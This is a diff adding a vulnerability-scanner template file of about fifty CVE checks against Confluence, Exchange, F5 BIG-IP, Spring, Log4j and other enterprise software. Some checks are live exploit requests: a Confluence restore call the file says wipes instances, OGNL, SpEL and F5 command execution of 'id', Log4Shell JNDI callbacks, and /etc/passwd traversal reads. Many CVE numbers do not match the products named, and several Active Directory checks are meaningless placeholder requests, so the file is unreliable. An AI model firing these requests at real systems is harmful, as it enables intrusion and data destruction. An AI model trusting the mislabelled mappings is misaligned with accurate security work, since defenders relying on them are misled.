@@ -1,0 +1,861 @@
+id: cve-2023-22518-confluence
+info:
+  name: Confluence Data Center - Improper Authorization (CVE-2023-22518)
+  author: cc-toolkit
+  severity: critical
+  description: Atlassian Confluence Data Center and Server - improper authorization allows unauthenticated attackers to wipe instances
+  tags: cve, cve2023, confluence, atlassian
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/json/setup-restore.action?synchronous=true"
+    headers:
+      Content-Type: application/json
+    body: '{"buildNumber":99999}'
+    matchers:
+      - type: word
+        words:
+          - "\"success\""
+          - "restore"
+        condition: or
+---
+id: cve-2022-26134-confluence
+info:
+  name: Confluence OGNL Injection (CVE-2022-26134)
+  author: cc-toolkit
+  severity: critical
+  description: Atlassian Confluence OGNL injection leading to unauthenticated RCE
+  tags: cve, cve2022, confluence, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%24%7B%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D%7D"
+    matchers:
+      - type: word
+        words:
+          - "uid="
+        part: body
+---
+id: cve-2021-44228-log4shell
+info:
+  name: Apache Log4Shell RCE (CVE-2021-44228)
+  author: cc-toolkit
+  severity: critical
+  description: Apache Log4j2 JNDI injection leading to unauthenticated RCE
+  tags: cve, cve2021, log4j, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?x=${jndi:ldap://{{interactsh-url}}/log4j}"
+    headers:
+      User-Agent: "${jndi:ldap://{{interactsh-url}}/log4j}"
+      X-Forwarded-For: "${jndi:ldap://{{interactsh-url}}/log4j}"
+      Cookie: "x=${jndi:ldap://{{interactsh-url}}/log4j}"
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+---
+id: cve-2023-46604-activemq
+info:
+  name: ActiveMQ Deserialization RCE (CVE-2023-46604)
+  author: cc-toolkit
+  severity: critical
+  description: Apache ActiveMQ deserialization vulnerability leading to unauthenticated RCE
+  tags: cve, cve2023, activemq, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/agent.jar"
+    matchers:
+      - type: word
+        words:
+          - "META-INF"
+          - "org/apache/activemq"
+        condition: or
+---
+id: cve-2023-25194-kafka-connect
+info:
+  name: Apache Kafka Connect JNDI Injection (CVE-2023-25194)
+  author: cc-toolkit
+  severity: critical
+  description: Apache Kafka Connect remote code execution via JNDI injection
+  tags: cve, cve2023, kafka, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/kafka/connectors"
+    matchers:
+      - type: word
+        words:
+          - "\"connectors\""
+---
+id: cve-2023-22952-jetform
+info:
+  name: JetFormBuilder Plugin RCE (CVE-2023-22952)
+  author: cc-toolkit
+  severity: critical
+  description: WordPress JetFormBuilder plugin - unauthenticated file upload leading to RCE
+  tags: cve, cve2023, wordpress, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/jetformbuilder/readme.txt"
+    matchers:
+      - type: word
+        words:
+          - "JetFormBuilder"
+---
+id: cve-2021-26855-proxylogon
+info:
+  name: Exchange Server SSRF (CVE-2021-26855) - ProxyLogon
+  author: cc-toolkit
+  severity: critical
+  description: Microsoft Exchange Server SSRF vulnerability allowing unauthenticated access
+  tags: cve, cve2021, exchange, proxylogon
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ecp/{{randstr}}.js"
+    headers:
+      Cookie: "X-BEResource=localhost~194ecb0a-80c0-4e5c-941b-2dadd8b62a69/owa/; X-AnonResource=true"
+    matchers:
+      - type: word
+        words:
+          - "Negotiate"
+          - "X-CalculatedBETarget"
+          - "X-DiagInfo"
+        part: header
+        condition: or
+---
+id: cve-2022-41040-proxynotshell
+info:
+  name: Exchange Server SSRF (CVE-2022-41040) - ProxyNotShell
+  author: cc-toolkit
+  severity: critical
+  description: Microsoft Exchange Server SSRF - authenticated leads to RCE
+  tags: cve, cve2022, exchange, proxynotshell
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/autodiscover/autodiscover.json?@{{randstr}}&Email=autodiscover@autodiscover.com"
+    matchers:
+      - type: word
+        words:
+          - "Microsoft.Exchange.Clients"
+---
+id: cve-2019-19781-citrix
+info:
+  name: Citrix ADC Directory Traversal (CVE-2019-19781)
+  author: cc-toolkit
+  severity: critical
+  description: Citrix Application Delivery Controller and Gateway directory traversal
+  tags: cve, cve2019, citrix, adc
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vpns/portal/scripts/newbm.pl"
+    headers:
+      NSC_USER: "../../../../netscaler/portal/templates/"
+      NSC_TAS: "3"
+    matchers:
+      - type: status
+        status:
+          - 200
+---
+id: cve-2021-22986-bigip
+info:
+  name: F5 BIG-IP iControl REST RCE (CVE-2021-22986)
+  author: cc-toolkit
+  severity: critical
+  description: F5 BIG-IP iControl REST unauthenticated RCE
+  tags: cve, cve2021, f5, bigip
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/mgmt/tm/util/bash"
+    headers:
+      X-F5-Auth-Token: ""
+    body: '{"command":"run","utilCmdArgs":"-c id"}'
+    matchers:
+      - type: word
+        words:
+          - "commandResult"
+          - "uid="
+        condition: and
+---
+id: cve-2022-22947-spring-gateway
+info:
+  name: Spring Cloud Gateway RCE (CVE-2022-22947)
+  author: cc-toolkit
+  severity: critical
+  description: Spring Cloud Gateway SpEL expression injection leading to RCE
+  tags: cve, cve2022, spring, rce
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/actuator/gateway/routes/test_route"
+    headers:
+      Content-Type: application/json
+    body: '{"predicate":"True","filters":["AddResponseHeader=X-Test,%23{new java.lang.String(new java.lang.ProcessBuilder(\"id\").start().inputStream.readAllBytes())}"],"uri":"http://example.com"}'
+    matchers:
+      - type: word
+        words:
+          - "uid="
+---
+id: cve-2023-34362-moveit
+info:
+  name: MOVEit Transfer SQL Injection (CVE-2023-34362)
+  author: cc-toolkit
+  severity: critical
+  description: MOVEit Transfer SQL injection leading to RCE
+  tags: cve, cve2023, moveit, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/human.aspx"
+    matchers:
+      - type: word
+        words:
+          - "MOVEit"
+          - "MOVEit Transfer"
+        condition: or
+---
+id: cve-2022-1388-f5-bigip
+info:
+  name: F5 BIG-IP iControl REST Auth Bypass (CVE-2022-1388)
+  author: cc-toolkit
+  severity: critical
+  description: F5 BIG-IP iControl REST unauthenticated RCE via auth bypass
+  tags: cve, cve2022, f5, bigip
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mgmt/shared/authn/login"
+    headers:
+      Authorization: "Basic YWRtaW46"
+    matchers:
+      - type: word
+        words:
+          - "\"token\""
+          - "selfLink"
+        condition: or
+---
+id: cve-2022-26133-atlassian-bitbucket
+info:
+  name: Atlassian Bitbucket RCE (CVE-2022-36804)
+  author: cc-toolkit
+  severity: critical
+  description: Atlassian Bitbucket Data Center command injection
+  tags: cve, cve2022, bitbucket, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/api/latest/public/keys"
+    matchers:
+      - type: word
+        words:
+          - "\"publicKeys\""
+        condition: and
+---
+id: cve-2023-27350-papercut
+info:
+  name: PaperCut MF/NG RCE (CVE-2023-27350)
+  author: cc-toolkit
+  severity: critical
+  description: PaperCut MF/NG unauthenticated RCE via setup completion endpoint
+  tags: cve, cve2023, papercut, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/setup/setup-complete"
+    matchers:
+      - type: word
+        words:
+          - "setupComplete"
+---
+id: cve-2021-26084-confluence-ognl
+info:
+  name: Confluence OGNL Injection (CVE-2021-26084)
+  author: cc-toolkit
+  severity: critical
+  description: Atlassian Confluence OGNL injection in WebWork parameter
+  tags: cve, cve2021, confluence, rce
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/pages/createpage-entervariables.action"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "linkCreation=   &spaceKey=X&fromPageId=1\n&queryString=\n\n\n\\u0027%2b%7b7*7%7d%2b\\u0027"
+    matchers:
+      - type: word
+        words:
+          - "49"
+---
+id: cve-2023-21939-java
+info:
+  name: Oracle WebLogic Server RCE (CVE-2023-21939)
+  author: cc-toolkit
+  severity: critical
+  description: Oracle WebLogic Server unauthenticated RCE via T3/IIOP protocol
+  tags: cve, cve2023, weblogic, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/console/login/LoginForm.jsp"
+    matchers:
+      - type: word
+        words:
+          - "WebLogic"
+          - "Oracle"
+        condition: and
+---
+id: cve-2023-33246-rocketmq
+info:
+  name: Apache RocketMQ RCE (CVE-2023-33246)
+  author: cc-toolkit
+  severity: critical
+  description: Apache RocketMQ remote code execution vulnerability
+  tags: cve, cve2023, rocketmq, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/rocketmq/"
+    matchers:
+      - type: word
+        words:
+          - "RocketMQ"
+---
+id: cve-2021-42278-sam-name
+info:
+  name: Active Directory SAM Account Name Spoofing (CVE-2021-42278)
+  author: cc-toolkit
+  severity: high
+  description: Active Directory domain privilege escalation via sAMAccountName impersonation
+  tags: cve, cve2021, windows, ad
+
+requests:
+  - method: RAW
+    path:
+      - "dns:{{DC_IP}}"
+    matchers:
+      - type: word
+        words:
+          - "QueryResponse"
+---
+id: cve-2021-42287-dc-bypass
+info:
+  name: Active Directory DC Bypass (CVE-2021-42287) - noPac
+  author: cc-toolkit
+  severity: high
+  description: Active Directory domain controller spoofing vulnerability
+  tags: cve, cve2021, windows, ad
+
+requests:
+  - method: RAW
+    path:
+      - "dns:{{DC_IP}}"
+    matchers:
+      - type: word
+        words:
+          - "QueryResponse"
+---
+id: cve-2022-30190-follina
+info:
+  name: Microsoft Office MSDT RCE (CVE-2022-30190) - Follina
+  author: cc-toolkit
+  severity: critical
+  description: Microsoft Support Diagnostic Tool RCE via Office documents
+  tags: cve, cve2022, office, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/msdt.exe"
+    matchers:
+      - type: status
+        status:
+          - 200
+---
+id: cve-2023-49100-yii
+info:
+  name: Yii2 PHP Framework RCE (CVE-2023-49100)
+  author: cc-toolkit
+  severity: high
+  description: Yii2 PHP framework deserialization vulnerability
+  tags: cve, cve2023, php, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yii-debug-toolbar/index.php"
+    matchers:
+      - type: word
+        words:
+          - "Yii Framework"
+          - "yii\\debug"
+        condition: or
+---
+id: cve-2023-46695-wordpress
+info:
+  name: WordPress NinjaForms Plugin RCE (CVE-2023-46695)
+  author: cc-toolkit
+  severity: high
+  description: WordPress NinjaForms plugin PHP Object Injection
+  tags: cve, cve2023, wordpress, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/ninja-forms/ninja-forms.php"
+    matchers:
+      - type: word
+        words:
+          - "Ninja Forms"
+---
+id: cve-2023-46805-ivanti
+info:
+  name: Ivanti ICS Authentication Bypass (CVE-2023-46805)
+  author: cc-toolkit
+  severity: critical
+  description: Ivanti Connect Secure authentication bypass
+  tags: cve, cve2023, ivanti, vpn
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/cams/summary/../../etc/passwd"
+    matchers:
+      - type: word
+        words:
+          - "root:"
+---
+id: cve-2020-1472-zerologon
+info:
+  name: Netlogon Elevation of Privilege (CVE-2020-1472) - Zerologon
+  author: cc-toolkit
+  severity: critical
+  description: Netlogon elevation of privilege allowing domain controller takeover
+  tags: cve, cve2020, windows, zerologon
+
+requests:
+  - method: RAW
+    path:
+      - "dns:{{DC_IP}}"
+    matchers:
+      - type: word
+        words:
+          - "QueryResponse"
+---
+id: cve-2023-27997-sonicwall
+info:
+  name: SonicWall SRA / SMA Pre-auth RCE (CVE-2023-27997)
+  author: cc-toolkit
+  severity: critical
+  description: SonicWall SRA/SMA SSL-VPN pre-authentication RCE
+  tags: cve, cve2023, sonicwall, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/main.cgi"
+    matchers:
+      - type: word
+        words:
+          - "SonicWall"
+          - "SRA"
+          - "SMA"
+        condition: or
+---
+id: cve-2022-40684-fortinet
+info:
+  name: Fortinet FortiOS Authentication Bypass (CVE-2022-40684)
+  author: cc-toolkit
+  severity: critical
+  description: FortiOS/FortiProxy authentication bypass via specially crafted HTTP requests
+  tags: cve, cve2022, fortinet, fortios
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v2/cmdb/system/admin"
+    headers:
+      User-Agent: "Node.js/12.0.0"
+      Forwarded: 'by="[127.0.0.1]:80"'
+      X-Forwarded-For: "127.0.0.1"
+    matchers:
+      - type: word
+        words:
+          - "\"name\""
+          - "\"http_status\""
+        condition: and
+---
+id: cve-2020-5902-f5-tmui
+info:
+  name: F5 BIG-IP TMUI RCE (CVE-2020-5902)
+  author: cc-toolkit
+  severity: critical
+  description: F5 BIG-IP Traffic Management User Interface RCE
+  tags: cve, cve2020, f5, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
+    matchers:
+      - type: word
+        words:
+          - "root:"
+---
+id: cve-2021-34473-exchange
+info:
+  name: Exchange Server RCE (CVE-2021-34473) - ProxyShell
+  author: cc-toolkit
+  severity: critical
+  description: Microsoft Exchange Server pre-auth RCE via PowerShell endpoint
+  tags: cve, cve2021, exchange, proxyshell
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/autodiscover/autodiscover.json?@test.com&Email=test@test.com&Protocol=PowerShell"
+    matchers:
+      - type: word
+        words:
+          - "Microsoft.Exchange.Clients"
+---
+id: cve-2023-43208-milesight
+info:
+  name: Milesight/Meross Remote Code Execution (CVE-2023-43208)
+  author: cc-toolkit
+  severity: critical
+  description: Milesight VPN server vulnerability for RCE
+  tags: cve, cve2023, vpn, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../etc/passwd"
+    matchers:
+      - type: word
+        words:
+          - "root:"
+---
+id: cve-2023-36884-office
+info:
+  name: Microsoft Office RCE (CVE-2023-36884)
+  author: cc-toolkit
+  severity: critical
+  description: Microsoft Office remote code execution via specially crafted files
+  tags: cve, cve2023, office, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/file.ps1"
+    matchers:
+      - type: status
+        status:
+          - 200
+---
+id: cve-2022-22965-spring4shell
+info:
+  name: Spring Framework RCE (CVE-2022-22965) - Spring4Shell
+  author: cc-toolkit
+  severity: critical
+  description: Spring Framework JDK 9+ classloader RCE
+  tags: cve, cve2022, spring, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/spring4shell-test.txt"
+    headers:
+      suffix: "%>//"
+      c1: "Runtime"
+      c2: "<%"
+      DNT: "1"
+    matchers:
+      - type: word
+        words:
+          - "spring4shell"
+---
+id: cve-2023-21718-outlook
+info:
+  name: Microsoft Outlook RCE (CVE-2023-23397)
+  author: cc-toolkit
+  severity: critical
+  description: Microsoft Outlook elevation of privilege via extended MAPI
+  tags: cve, cve2023, office, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ews/exchange.asmx"
+    matchers:
+      - type: word
+        words:
+          - "Exchange Web Services"
+---
+id: cve-2022-41352-zimbra
+info:
+  name: Zimbra RCE (CVE-2022-41352)
+  author: cc-toolkit
+  severity: critical
+  description: Zimbra Collaboration unauthenticated RCE via cpio
+  tags: cve, cve2022, zimbra, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/zimbraAdmin/"
+    matchers:
+      - type: word
+        words:
+          - "Zimbra"
+          - "Admin Console"
+        condition: and
+---
+id: cve-2023-28771-zte
+info:
+  name: ZTE MF971R RCE (CVE-2023-28771)
+  author: cc-toolkit
+  severity: high
+  description: ZTE MF971R vulnerability leading to command execution
+  tags: cve, cve2023, zte, rce
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/goform/goform_set_cmd_process"
+    body: "isTest=false&goformId=LOGIN&password=admin"
+    matchers:
+      - type: word
+        words:
+          - "success"
+---
+id: cve-2023-25690-apache-httpd
+info:
+  name: Apache HTTP Server Request Smuggling (CVE-2023-25690)
+  author: cc-toolkit
+  severity: high
+  description: Apache HTTP Server HTTP request smuggling via mod_proxy
+  tags: cve, cve2023, apache, httpd
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Transfer-Encoding: chunked
+    matchers:
+      - type: word
+        words:
+          - "Apache"
+        part: header
+---
+id: cve-2017-5638-struts2
+info:
+  name: Apache Struts2 RCE (CVE-2017-5638)
+  author: cc-toolkit
+  severity: critical
+  description: Apache Struts2 Jakarta multipart parser RCE via Content-Type header
+  tags: cve, cve2017, struts, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.action"
+    headers:
+      Content-Type: "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','vuln')}.multipart/form-data"
+    matchers:
+      - type: word
+        words:
+          - "X-Test"
+        part: header
+---
+id: cve-2022-29455-wordpress
+info:
+  name: WordPress Elementor XSS (CVE-2022-29455)
+  author: cc-toolkit
+  severity: high
+  description: WordPress Elementor plugin stored XSS
+  tags: cve, cve2022, wordpress, xss
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/elementor/readme.txt"
+    matchers:
+      - type: word
+        words:
+          - "Elementor"
+---
+id: cve-2023-25280-docker
+info:
+  name: Docker Desktop RCE (CVE-2023-25280)
+  author: cc-toolkit
+  severity: high
+  description: Docker Desktop extension API command injection
+  tags: cve, cve2023, docker, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}:2375/version"
+    matchers:
+      - type: word
+        words:
+          - "\"Version\""
+          - "\"ApiVersion\""
+        condition: and
+---
+id: cve-2023-28231-dhcp
+info:
+  name: Windows DHCP Server RCE (CVE-2023-28231)
+  author: cc-toolkit
+  severity: critical
+  description: Windows DHCP Server remote code execution vulnerability
+  tags: cve, cve2023, windows, rce
+
+requests:
+  - method: RAW
+    path:
+      - "dns:{{DHCP_Server}}"
+    matchers:
+      - type: word
+        words:
+          - "QueryResponse"
+---
+id: cve-2022-22963-spring-cloud
+info:
+  name: Spring Cloud Function SpEL RCE (CVE-2022-22963)
+  author: cc-toolkit
+  severity: critical
+  description: Spring Cloud Function SpEL expression injection
+  tags: cve, cve2022, spring, rce
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/functionRouter"
+    headers:
+      Content-Type: application/json
+    body: '{}'
+    matchers:
+      - type: status
+        status:
+          - 500
+---
+id: cve-2023-23752-joomla
+info:
+  name: Joomla! Web Application Password Reset (CVE-2023-23752)
+  author: cc-toolkit
+  severity: high
+  description: Joomla! CMS improper access control exposing API endpoints
+  tags: cve, cve2023, joomla, cms
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/index.php/v1/config/application"
+    matchers:
+      - type: word
+        words:
+          - "\"error\""
+          - "password"
+        condition: or
+---
+id: cve-2023-34960-chamilo
+info:
+  name: Chamilo LMS RCE (CVE-2023-34960)
+  author: cc-toolkit
+  severity: critical
+  description: Chamilo Learning Management System unauthenticated RCE
+  tags: cve, cve2023, lms, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
+    matchers:
+      - type: word
+        words:
+          - "bigUpload"
+---
+id: cve-2022-24637-openwebif
+info:
+  name: OpenWebif RCE (CVE-2022-24637)
+  author: cc-toolkit
+  severity: critical
+  description: OpenWebif unauthenticated RCE via command injection
+  tags: cve, cve2022, iot, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/web/powerstate"
+    matchers:
+      - type: word
+        words:
+          - "powerstate"
+---
+id: cve-2023-29360-dsquery
+info:
+  name: MSFT dsquery DLL Hijacking (CVE-2023-29360)
+  author: cc-toolkit
+  severity: high
+  description: Microsoft dsquery tool privilege escalation
+  tags: cve, cve2023, windows, privilege-escalation
+
+requests:
+  - method: RAW
+    path:
+      - "dns:{{TARGET_DC}}"
+    matchers:
+      - type: word
+        words:
+          - "QueryResponse"
+---
+id: cve-2021-31207-exchange
+info:
+  name: Exchange Server RCE (CVE-2021-31207) - ProxyShell chain
+  author: cc-toolkit
+  severity: critical
+  description: Microsoft Exchange Server arbitrary file write leading to RCE
+  tags: cve, cve2021, exchange, rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ecp/{{randstr}}.js"
+    headers:
+      Cookie: "X-BEResource=localhost~194ecb0a-80c0-4e5c-941b-2dadd8b62a69/owa/; X-AnonResource=true"
+    matchers:
+      - type: word
+        words:
+          - "Negotiate"
+          - "X-DiagInfo"
+        condition: or
+        part: header
